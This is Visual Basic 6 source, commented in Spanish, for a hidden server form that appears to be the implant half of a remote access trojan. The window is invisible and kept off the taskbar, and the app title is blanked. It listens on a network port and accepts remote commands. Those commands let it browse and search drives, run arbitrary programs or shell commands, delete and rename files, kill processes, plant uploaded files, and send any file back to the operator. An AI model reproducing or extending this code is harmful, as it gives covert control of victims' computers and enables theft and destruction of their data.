VERSION 5.00
Begin VB.Form FormP 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   ClientHeight    =   570
   ClientLeft      =   0
   ClientTop       =   105
   ClientWidth     =   2055
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "Servidor.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   482.977
   ScaleMode       =   0  'User
   ScaleWidth      =   2055
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   490
      Left            =   0
      ScaleHeight     =   495
      ScaleWidth      =   495
      TabIndex        =   0
      Top             =   0
      Width           =   490
   End
End
Attribute VB_Name = "FormP"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'-------Obtener Drive
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
'------Ejecutar
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function PathIsURL Lib "shlwapi.dll" Alias "PathIsURLA" (ByVal pszPath As String) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
'-------Busqueda
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetFileAttributes Lib "kernel32" Alias "GetFileAttributesA" (ByVal lpFileName As String) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long


Const MAXDWORD = &HFFFF
Const INVALID_HANDLE_VALUE = -1
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_TEMPORARY = &H100

Private Type FILETIME
dwLowDateTime As Long
dwHighDateTime As Long
End Type

Private Type WIN32_FIND_DATA
dwFileAttributes As Long
ftCreationTime As FILETIME
ftLastAccessTime As FILETIME
ftLastWriteTime As FILETIME
nFileSizeHigh As Long
nFileSizeLow As Long
dwReserved0 As Long
dwReserved1 As Long
cFileName As String * MAX_PATH
cAlternate As String * 14
End Type
'--------Carpetas
Dim FSO As New Scripting.FileSystemObject

'-------Obtener Iconos
Private Declare Function SHGetFileInfo Lib "shell32.dll" Alias "SHGetFileInfoA" (ByVal pszPath As String, ByVal dwFileAttributes As Long, psfi As SHFILEINFO, ByVal cbFileInfo As Long, ByVal uFlags As Long) As Long
Private Declare Function ImageList_Draw Lib "comctl32.dll" (ByVal himl As Long, ByVal i As Long, ByVal hdcDst As Long, ByVal X As Long, ByVal Y As Long, ByVal fStyle As Long) As Long


Private Const SHGFI_LARGEICON = &H0           ' get large icon
Private Const SHGFI_SMALLICON = &H1           ' get small icon
Private Const SHGFI_SYSICONINDEX = &H4000        ' get system icondex
Private Const ILD_TRANSPARENT = &H1

Private Type SHFILEINFO
    hIcon As Long           ' : icon
    iIcon As Long     ' : icondex
    dwAttributes As Long        ' : SFGAO_ flags
    szDisplayName As String * MAX_PATH ' : display name (or path)
    szTypeName As String * 80     ' : type name
End Type

'--------Declaraciones
Dim LenArchivo As Long
Dim i As Integer
Public Tiempo As Integer
Dim Imagen() As Byte
Dim FileArchivo() As Byte
Dim Orden$, Ruta$, Tamaño$, Vistas$, ArchivoBuscar$, RutaEstatica$
Dim BytesArchivos@, Detener@, Conectar@, Seleccionar@, Ejecutar@, Eliminar@, RenombrarArchivo@
Dim Exportar@, Importar@, Binario@, killProcesos@, Cortar@, Copiar@, VistaIconos@, Carpetas@
Dim killVentanas@, Buscar@, RutaBuscar@, DetenerBusqueda@, NuevaCarpeta@, EliminarCarpeta@, Confirma@
'----------------
Dim ancho As Single, alto As Single, porcentaje As Single
Dim ImagenFoto As IPictureDisp
Dim X  As Long, Y As Long

Private Sub Form_Load()
RutaEstatica = "\"
Tiempo = 1
App.Title = ""
Escuchar
IniciarGDI (True)
End Sub
Sub Escuchar()

    StartWinsock vbNullString
    'Text1 = GetIPAddress
    
    StartSubclass Me
   
    listenSocket = ListenForConnect(SERVER_PORT, Me.hWnd)
    'If listenSocket = INVALID_SOCKET Then End
    Vistas = "Smallicons"
    Carpetas = False
End Sub
Sub CerrarConexion()
Dim Cnt As Long
Confirma = True
    For Cnt = 1 To Sockets.Count
        closesocket Sockets.Item(Cnt)
    Next Cnt
    closesocket listenSocket
    StopSubclass Me
    EndWinsock
    Set Sockets = Nothing
    Set IPAddresses = Nothing
End Sub
Private Sub Form_Unload(Cancel As Integer)
Confirma = True
IniciarGDI (False)
CerrarConexion
End Sub

Private Sub Dir1_Change(RutaDir As String)

On Error Resume Next
RutaEstatica = RutaDir
Dim ListadoFiles() As String, ListadoDir() As String

ReDim ListadoFiles(0)
ReDim ListadoDir(0)

Dim Directorios As String, TamañoArchvio As String
Directorios = Dir(RutaDir & "\", vbDirectory)
Do While Directorios <> ""
DoEvents
If Directorios <> "." And Directorios <> ".." Then
    If (GetAttr(RutaDir & "\" & Directorios) And vbDirectory) = vbDirectory Then
        ListadoDir(UBound(ListadoDir)) = RutaDir & Directorios
        ReDim Preserve ListadoDir(UBound(ListadoDir) + 1)
    Else
        ListadoFiles(UBound(ListadoFiles)) = Directorios
        ReDim Preserve ListadoFiles(UBound(ListadoFiles) + 1)
    End If
End If
Directorios = Dir
Loop
'---------


Enivar ("Borrar")
For i = 0 To UBound(ListadoDir) - 1

If Detener Then Exit For
    Enivar ("Directorio")
    Enivar (ListadoDir(i))
    If Carpetas Then
        Enivar ("File")
        Enivar (Right(ListadoDir(i), Len(ListadoDir(i)) - InStrRev(ListadoDir(i), "\")))
        Enivar (Chr(32))
        Enivar FileDateTime(ListadoDir(i))
    End If
Next
    
For i = 0 To UBound(ListadoFiles) - 1

    If Detener Then Exit For
        Enivar ("File")
        Enivar (ListadoFiles(i))
    
   
        Ruta = RutaDir & "\"
   
    TamañoArchvio = FileLen(Ruta & ListadoFiles(i))
    Enivar (Format$(Format$((TamañoArchvio \ 1024) + 1, "##,###,##0") & " KB", "@@@@@@@@@@@@"))
    Enivar FileDateTime(Ruta & ListadoFiles(i))

Next
'-------------------------

If Not Vistas = "SinIconos" Then

    If Carpetas Then
        For i = 0 To UBound(ListadoDir) - 1
       
        If Detener Then Exit For


            Enivar ("Iconos")
            Ruta = ListadoDir(i)
            TamañoVistas
        Next
    End If

For i = 0 To UBound(ListadoFiles) - 1

    If Detener Then Exit For
    Enivar ("Iconos")
   
        Ruta = RutaDir
    
    Ruta = Ruta & ListadoFiles(i)
    TamañoVistas
Next

End If
If Detener Then Detener = False
    
Enivar ("Completo")

End Sub
Sub TamañoVistas()
Dim hImage As Long, udtFI As SHFILEINFO

Select Case Vistas
  
Case "VistaMiniatura"
    
    Dim Formato As String
    Formato = LCase(Right(Ruta, 3))
    
        If Formato = "jpg" Or Formato = "bmp" Or Formato = "gif" Then
            Cargar (Ruta)
            
        Else
            Picture1.Width = 490: Picture1.Height = 490
            Picture1.Cls
            hImage = SHGetFileInfo(Ruta, ByVal 0&, udtFI, Len(udtFI), SHGFI_SYSICONINDEX Or SHGFI_LARGEICON)
            ImageList_Draw hImage, udtFI.iIcon, Picture1.hdc, 0, 0, ILD_TRANSPARENT
            'SavePicture Picture1.image, App.path & "\temporal.jpg"
            SavePictureAsJPG Picture1.image, App.Path & "\temporal.jpg", 85
       
        End If
    
Case "Smallicons"
    Picture1.Cls
    Picture1.Width = 240: Picture1.Height = 240
    hImage = SHGetFileInfo(Ruta, ByVal 0&, udtFI, Len(udtFI), SHGFI_SYSICONINDEX Or SHGFI_SMALLICON)
    ImageList_Draw hImage, udtFI.iIcon, Picture1.hdc, 0, 0, SHGFI_SMALLICON
    SavePicture Picture1.image, App.Path & "\temporal.jpg"
    'SavePictureAsJPG Picture1.image, App.path & "\temporal.jpg", 85
  

Case "Iconos"
    Picture1.Cls
    Picture1.Width = 490: Picture1.Height = 490
    hImage = SHGetFileInfo(Ruta, ByVal 0&, udtFI, Len(udtFI), SHGFI_SYSICONINDEX Or SHGFI_LARGEICON)
    ImageList_Draw hImage, udtFI.iIcon, Picture1.hdc, 0, 0, ILD_TRANSPARENT
    'SavePicture Picture1.image, App.path & "\temporal.jpg"
    SavePictureAsJPG Picture1.image, App.Path & "\temporal.jpg", 70
   
End Select
ImportarArchivo App.Path & "\temporal.jpg", 1500 'lo divido en segmentos 5000 bytes

End Sub


Public Sub DataArrival(Orden As String)
On Error GoTo Reportar

        Select Case Orden
            Case "EnviarUnidades"
                EnviarUnidades
                Exit Sub
           Case "ReiniciarAplicacion"
                CerrarConexion
                Shell App.Path & "\" & App.EXEName & ".exe"
                Unload Me
            Case "FinalizarServidor"
                Unload Me
                Exit Sub
            Case "Actualizar"
                Dir1_Change (RutaEstatica)
                Exit Sub
            Case "Detener"
                Detener = True
                Confirma = True
                Exit Sub
            Case "VistaIconos"
                VistaIconos = True
                Exit Sub
            Case "Seleccionar"
                Seleccionar = True
                Exit Sub
            Case "Ejecutar"
                Ejecutar = True
                Exit Sub
            Case "Eliminar"
                Eliminar = True
                Exit Sub
            Case "Exportar"
                Exportar = True
                Exit Sub
            Case "Importar"
                Importar = True
                Exit Sub
            Case "Procesos"
                Procesosw
                Exit Sub
            Case "Aplicaciones"
                Call EnumTopWindowsw
                Exit Sub
            Case "killProcesos"
                killProcesos = True
                Exit Sub
            Case "killVentanas"
                killVentanas = True
                Exit Sub
            Case "Buscar"
                Buscar = True
                Exit Sub
            Case "DetenerBusqueda"
                DetenerBusqueda = True
                Buscar = False
                Exit Sub
            Case "NuevaCarpeta"
                NuevaCarpeta = True
                Exit Sub
            Case "EliminarCarpeta"
                EliminarCarpeta = True
                Exit Sub
            Case "RenombrarArchivo"
                RenombrarArchivo = True
                Exit Sub
            Case "Cortar"
                Cortar = True
                Exit Sub
            Case "Copiar"
                Copiar = True
                Exit Sub
            Case "Carpetas"
                If Carpetas = False Then Carpetas = True Else Carpetas = False
                Dir1_Change (RutaEstatica)
                Exit Sub
            Case "#ok#"
                Confirma = True
    End Select
    If VistaIconos Then VistaIconos = False: Vistas = Orden: Dir1_Change (RutaEstatica): Exit Sub
   
    If RenombrarArchivo Then
        RenombrarArchivo = False
        Dim NuevoNombre As String
        Dim ViejoNombre As String
        NuevoNombre = Right(Orden, Len(Orden) - InStrRev(Orden, "?"))
        ViejoNombre = Left(Orden, Len(Orden) - Len(NuevoNombre) - 1)
        Name ViejoNombre As NuevoNombre
        Exit Sub
    End If
    
    If Cortar Then
        Cortar = False
        NuevoNombre = Right(Orden, Len(Orden) - InStrRev(Orden, "?"))
        ViejoNombre = Left(Orden, Len(Orden) - Len(NuevoNombre) - 1)
        If Dir(ViejoNombre, vbArchive) <> "" Then
        Name ViejoNombre As NuevoNombre
        Else
        Set FSO = New FileSystemObject ' Se crea la instancia
        FSO.CopyFolder ViejoNombre, NuevoNombre
        FSO.DeleteFolder ViejoNombre
        Enivar ("EdicionOk")
        Set FSO = Nothing
        End If
        Dir1_Change (RutaEstatica)
        Exit Sub
    End If
    
    If Copiar Then
        Copiar = False
        NuevoNombre = Right(Orden, Len(Orden) - InStrRev(Orden, "?"))
        ViejoNombre = Left(Orden, Len(Orden) - Len(NuevoNombre) - 1)
        If Dir(ViejoNombre, vbArchive) <> "" Then
        FileCopy ViejoNombre, NuevoNombre
        Else
        Set FSO = New FileSystemObject ' Se crea la instancia
        FSO.CopyFolder ViejoNombre, NuevoNombre
        Set FSO = Nothing
        End If
        Dir1_Change (RutaEstatica)
        Exit Sub
    End If
    
    If Ejecutar Then
        Ejecutar = False
        If CStr(CBool(PathFileExists(Orden))) = True Or CStr(CBool(PathIsURL(Orden))) = True Then
            ShellExecute 0, vbNullString, Orden, vbNullString, vbNullString, 1
        Else
            Shell Orden
            Exit Sub
        End If
    End If

    If EliminarCarpeta Then EliminarCarpeta = False: FSO.DeleteFolder Orden: Enivar ("EdicionOk"): Exit Sub
    If NuevaCarpeta Then NuevaCarpeta = False: MkDir (Orden): Exit Sub
    If Seleccionar Then Seleccionar = False: Dir1_Change (Orden): Exit Sub
    If Eliminar Then Eliminar = False: Kill Orden: Exit Sub
    If killProcesos Then killProcesos = False: Shell "taskkill /f /im" & " " & Orden: Exit Sub
    If killVentanas Then killVentanas = False: CloseApp (Orden): Exit Sub
    
    'exportar una archivo del servidor al cliente(el que importa es el cliente)
    If Importar Then
    Importar = False
    Enivar ("Importar") ' le aviso al cliente que voy a importar
    ImportarArchivo Orden, 5000 ' el que importa el archivo es el cliente y divido el paquete en 5000 bytes
    Detener = False
    Exit Sub
    End If
        
    If Buscar Then
        If Not RutaBuscar Then
            RutaBuscar = True
            ArchivoBuscar = Orden
            Exit Sub
        Else
            RutaBuscar = False
            Buscar = False
            ComenzarBusqueda (Orden)
            Exit Sub
        End If
    End If
    

If Exportar Then
        If Not BytesArchivos Then Open Orden For Binary As #2: BytesArchivos = True: Exit Sub
    
            Dim CadenaA As String
            CadenaA = Replace(Orden, "FinArchivo", "")
        If Len(CadenaA) < Len(Orden) Then
                Put #2, , CadenaA
                Exportar = False
                BytesArchivos = False
                ReportarError ("El archivo a sido exportado con exito")
                Close #2
            Exit Sub
        
        Else
            Dim CadenaB As String
            CadenaB = Replace(Orden, "#Confirma#", "")
            If Len(CadenaB) < Len(Orden) Then
                Enivar "#ok#"
                Put #2, , CadenaB
            Else
                Put #2, , Orden
            End If
        End If
Exit Sub
End If

Exit Sub
Reportar:
ReportarError (Error)
End Sub
Sub ReportarError(Error As String)
On Error Resume Next
Enivar ("ReporteError")
Enivar (Error)
End Sub
Private Sub EnviarUnidades()

Dim strSave As String
Dim Ret As String
strSave = String(255, Chr$(0))
Dim hImage As Long, udtFI As SHFILEINFO
Dim WScript As Object
Set WScript = CreateObject("WScript.Shell")
Enivar ("CarpetasEspeciales")
Enivar (WScript.SpecialFolders("Desktop"))
Enivar ("CarpetasEspeciales")
Enivar (WScript.SpecialFolders("MyDocuments"))
Set WScript = Nothing
Ret = GetLogicalDriveStrings(255, strSave)

Dim keer As Integer

For keer = 1 To 20
       
        Dim Disco As String
        If Left$(strSave, InStr(1, strSave, Chr$(0))) = Chr$(0) Then Exit For
        Disco = Left$(strSave, InStr(1, strSave, Chr$(0)) - 1)
        Picture1.Width = 490: Picture1.Height = 490
        Picture1.Cls
        hImage = SHGetFileInfo(Disco, ByVal 0&, udtFI, Len(udtFI), SHGFI_SYSICONINDEX Or SHGFI_LARGEICON)
        ImageList_Draw hImage, udtFI.iIcon, Picture1.hdc, 0, 0, ILD_TRANSPARENT
        'SavePicture Picture1.image, App.path & "\temporal.jpg"
        SavePictureAsJPG Picture1.image, App.Path & "\temporal.jpg", 70
        Enivar ("Disco")
        ImportarArchivo App.Path & "\temporal.jpg", 1500 'lo divido en segmentos 5000 bytes
        Enivar (Disco)
        strSave = Right$(strSave, Len(strSave) - InStr(1, strSave, Chr$(0)))
      
Next keer

End Sub

Sub ComenzarBusqueda(Orden As String)
Dim SearchPath As String, FindStr As String
Dim FileSize As Long
Dim NumFiles As Integer, NumDirs As Integer
SearchPath = Orden
FindStr = ArchivoBuscar
FileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)
Enivar ("FinBusqueda")
Enivar (NumFiles & " Archivos encontrados en " & NumDirs + 1 & " Directorios")
Enivar ("Tamaños de archivos encontrados en " & SearchPath & " = " & Format(FileSize, "#,###,###,##0") & " Bytes")
End Sub
Function StripNulls(OriginalStr As String) As String
If (InStr(OriginalStr, Chr(0)) > 0) Then
OriginalStr = Left(OriginalStr, InStr(OriginalStr, Chr(0)) - 1)
End If
StripNulls = OriginalStr
End Function

Function FindFilesAPI(Path As String, SearchStr As String, FileCount As Integer, DirCount As Integer)
Dim FileName As String ' Walking filename variable...
Dim DirName As String ' SubDirectory Name
Dim dirNames() As String ' Buffer for directory name entries
Dim nDir As Integer ' Number of directories in this path
Dim i As Integer ' For-loop counter...
Dim hSearch As Long ' Search Handle
Dim WFD As WIN32_FIND_DATA
Dim Cont As Integer
If Right(Path, 1) <> "\" Then Path = Path & "\"
' Search for subdirectories.
nDir = 0
ReDim dirNames(nDir)
Cont = True
hSearch = FindFirstFile(Path & "*", WFD)
If hSearch <> INVALID_HANDLE_VALUE Then
Do While Cont
If DetenerBusqueda Then DetenerBusqueda = False: Exit Do
DirName = StripNulls(WFD.cFileName)
' Ignore the current and encompassing directories.
If (DirName <> ".") And (DirName <> "..") Then
' Check for directory with bitwise comparison.
If GetFileAttributes(Path & DirName) And FILE_ATTRIBUTE_DIRECTORY Then
dirNames(nDir) = DirName
DirCount = DirCount + 1
nDir = nDir + 1
ReDim Preserve dirNames(nDir)
DoEvents
End If
End If
Cont = FindNextFile(hSearch, WFD) 'Get next subdirectory.
Loop
Cont = FindClose(hSearch)
End If
' Walk through this directory and sum file sizes.
hSearch = FindFirstFile(Path & SearchStr, WFD)
Cont = True
If hSearch <> INVALID_HANDLE_VALUE Then
While Cont
FileName = StripNulls(WFD.cFileName)
If (FileName <> ".") And (FileName <> "..") Then
FindFilesAPI = FindFilesAPI + (WFD.nFileSizeHigh * MAXDWORD) + WFD.nFileSizeLow
FileCount = FileCount + 1
Enivar (Path & FileName)

Ruta = FileLen(Path & FileName)
Enivar (Format$(Format$((Ruta \ 1024) + 1, "##,###,##0") & " KB", "@@@@@@@@@@@@"))
Enivar FileDateTime(Path & FileName)
End If
Cont = FindNextFile(hSearch, WFD) ' Get next file
Wend
Cont = FindClose(hSearch)
End If
' If there are sub-directories...
If nDir > 0 Then
' Recursively walk into them...
For i = 0 To nDir - 1
FindFilesAPI = FindFilesAPI + FindFilesAPI(Path & dirNames(i) & "\", SearchStr, FileCount, DirCount)
Next i
End If
End Function

Private Sub ImportarArchivo(Archivo As String, Segmento As Long)  'archivo = a la ruta del archivo

Dim FileData() As Byte, LenResto&, pos&, partes&, Tamaño&, i&
Tamaño = FileLen(Archivo)
pos = 1
partes = Tamaño / Segmento 'divido al archivo en segmentos de 5000 bytes o lo que fuere segmentos
If partes = 0 Then partes = 1 'por si es menor a segmento
LenResto = Tamaño Mod partes

Open Archivo For Binary Access Read As #3

For i = 1 To partes


' si deseo detener la operacion
If Detener Then ReportarError ("Se canselo la operación"): Close #3: Exit Sub

If i = partes Then
    ReDim FileData(Tamaño / partes + LenResto - 1)
    Get #3, pos, FileData
    Close #3
    SendDataw SocketHandle, FileData 'envio el resto
    
    
Else


    ReDim FileData(Tamaño / partes - 1)
    Get #3, pos, FileData
    SendDataw SocketHandle, FileData 'envio las partes
    pos = pos + Tamaño / partes

    
End If
ConfirmarEnvio
Next

Enivar ("FinArchivo") ' le idndico que el archivo se envio completo

End Sub

Public Function Enivar(Orden As String)
On Error Resume Next
SendDataw SocketHandle, Orden & "t#z@" 'el cliente separa el dato cuando se encuentra con t#z@
End Function

Private Sub Cargar(sRuta As String)
On Error Resume Next
Picture1.Width = 1800: Picture1.Height = 1800
Picture1.Cls
Set ImagenFoto = LoadPicture(sRuta)
ancho = ImagenFoto.Width
alto = ImagenFoto.Height
If ancho < Picture1.Width And alto < Picture1.Height Then
porcentaje = 100
CentrarPicture
Exit Sub
End If

If ancho > Picture1.Width Or alto > Picture1.Height Then
If ancho > alto Then
porcentaje = (Picture1.Width * 100) / ancho
Else
porcentaje = (Picture1.Height * 100) / alto
End If
CentrarPicture
Exit Sub
End If

If ancho <= Picture1.Width Or alto <= Picture1.Height Then
If ancho > alto Then
porcentaje = (Picture1.Width * 100) / ancho
Else
porcentaje = (Picture1.Width * 100) / alto
End If
CentrarPicture
End If
End Sub


Public Sub CentrarPicture()
ancho = (ancho * porcentaje) / 100
alto = (alto * porcentaje) / 100
Picture1.Width = ancho
Picture1.Height = alto
Picture1.PaintPicture ImagenFoto, 0, 0, ancho, alto
'SavePicture Picture1.image, App.path & "\temporal.jpg"
SavePictureAsJPG Picture1.image, App.Path & "\temporal.jpg", 65
End Sub

Sub ConfirmarEnvio()
Confirma = False
Enivar ("#Confirma#")
While Not Confirma = True   'creo un bucle hasta que confirme la llegada del paquete
DoEvents
Wend
End Sub
